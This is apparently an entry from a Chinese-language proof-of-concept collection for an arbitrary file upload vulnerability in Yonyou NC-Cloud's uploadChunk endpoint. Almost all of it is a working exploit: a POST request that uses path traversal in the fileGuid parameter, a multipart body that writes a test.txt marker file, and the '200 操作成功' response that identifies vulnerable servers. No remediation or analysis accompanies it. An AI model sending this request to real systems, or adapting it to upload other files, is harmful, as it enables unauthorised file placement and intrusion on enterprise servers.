# 用友NC-ClouduploadChunk任意文件上传漏洞

用友 ｜ 文件上传 ｜ —
- **请求**：`POST /ncchr/pm/fb/attachment/uploadChunk?fileGuid=/../../../nccloud/&chunk=1&chunks=1 HTTP/1.1`

**Payload**
```
--024ff46f71634a1c9bf8ec5820c26fa9
Content-Disposition: form-data; name="file"; filename="test.txt"
This website has an arbitrary file upload vulnerability
--024ff46f71634a1c9bf8ec5820c26fa9--
```
- **响应特征**：200 操作成功